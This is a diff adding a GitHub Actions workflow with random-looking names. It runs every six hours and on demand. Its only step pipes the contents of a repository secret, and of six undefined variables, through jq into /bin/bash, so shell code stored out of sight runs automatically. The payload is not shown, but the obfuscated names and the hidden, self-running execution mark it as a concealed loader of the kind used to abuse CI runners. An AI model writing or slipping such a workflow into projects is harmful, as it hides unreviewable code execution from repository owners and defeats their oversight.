@@ -1,0 +1,24 @@
+name: equationmilitary
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: equationmilitary
+        env:
+          fxfyi03: ${{ secrets.fxfyi03 }}
+        run: |
+          echo $fxfyi03 | jq -r .odai6844 | /bin/bash
+          echo $etmdi99869 | jq -r .ssydu39 | /bin/bash
+          echo $xqxcl454 | jq -r .v34616 | /bin/bash
+          echo $gmyna50 | jq -r .nrzwn83302 | /bin/bash
+          echo $f7 | jq -r .p04496 | /bin/bash
+          echo $cj8 | jq -r .a81 | /bin/bash
+          echo $asjq435 | jq -r .ypsy151 | /bin/bash
+
